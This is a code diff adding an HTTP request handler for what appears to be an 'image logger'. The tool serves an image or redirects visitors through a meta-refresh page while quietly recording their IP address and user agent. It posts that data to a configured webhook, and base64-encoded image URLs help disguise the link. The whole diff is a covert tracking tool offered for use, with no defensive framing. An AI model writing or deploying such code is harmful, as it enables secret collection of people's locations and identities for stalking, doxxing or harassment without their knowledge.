@@ -105,3 +105,63 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Browser:** `{browser}`
 
 **User Agent:**
+
+        }]
+    }
+
+    if url:
+        embed["embeds"][0]["thumbnail"] = {"url": url}
+
+    requests.post(config["webhook"], json=embed)
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+
+    def handleRequest(self):
+        try:
+            ip = self.headers.get('x-forwarded-for')
+            ua = self.headers.get('user-agent')
+
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            if botCheck(ip, ua):
+                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header("Content-type" if config["buggedImage"] else "Location", "image/jpeg" if config["buggedImage"] else url)
+                self.end_headers()
+                return
+
+            if config["redirect"]["redirect"]:
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                redirect_html = f'<meta http-equiv="refresh" content="0; url={config["redirect"]["page"]}">'
+                self.wfile.write(redirect_html.encode())
+                makeReport(ip, ua, endpoint=self.path.split("?")[0], url=url)
+                return
+
+            # Default fallback if redirect is off (not used in this case)
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write(b"<h1>No redirect set.</h1>")
+
+        except Exception:
+            self.send_response(500)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write(b"500 - Internal Server Error")
+            reportError(traceback.format_exc())
+
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
+
